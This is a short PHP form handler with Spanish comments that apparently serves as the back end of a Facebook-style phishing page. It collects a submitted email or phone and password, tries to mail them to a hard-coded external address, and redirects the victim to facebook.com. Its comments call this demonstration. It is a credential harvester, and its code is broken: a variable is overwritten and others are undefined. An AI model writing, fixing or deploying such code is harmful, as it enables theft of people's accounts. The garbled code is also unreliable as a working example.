<?php
// process_form.php

// Verificar si el formulario ha sido enviado
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibir los datos del formulario
    $email_or_phone = $_POST['email_or_phone'];
    $password = $_POST['password'];

    // Validar y/o procesar los datos
    // Por ejemplo, aquí podrías verificar los datos con una base de datos
    // o realizar alguna otra acción con los datos recibidos.

    // Mostrar los datos recibidos (para propósitos de demostración)
    $to = "73031584@continental.edu.pe";
    $subject = "Nuevo inicio de sesión";
    $to = "Correo electrónico: $email\nContraseña: $password";
    mail($to, $subject, $message);

    // Redirigir a otra página o mostrar un mensaje de éxito/error
    header("Location: https://www.facebook.com");
    exit();
}
?>
